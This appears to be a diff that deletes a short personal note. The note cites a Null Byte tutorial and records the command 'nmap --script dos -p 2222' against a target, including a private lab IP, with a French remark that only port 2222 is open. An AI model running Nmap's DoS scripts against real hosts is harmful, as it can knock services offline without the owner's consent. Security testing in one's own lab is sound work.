@@ -1,7 +1,0 @@
-https://null-byte.wonderhowto.com/how-to/use-nmap-7-discover-vulnerabilities-launch-dos-attacks-and-more-0168788/
-
-nmap --script dos -p 2222 <target.com or ip> <enter>
-
-nmap --script dos -p 2222 10.11.17.140
-Seul mon port 2222 est ouvert
-
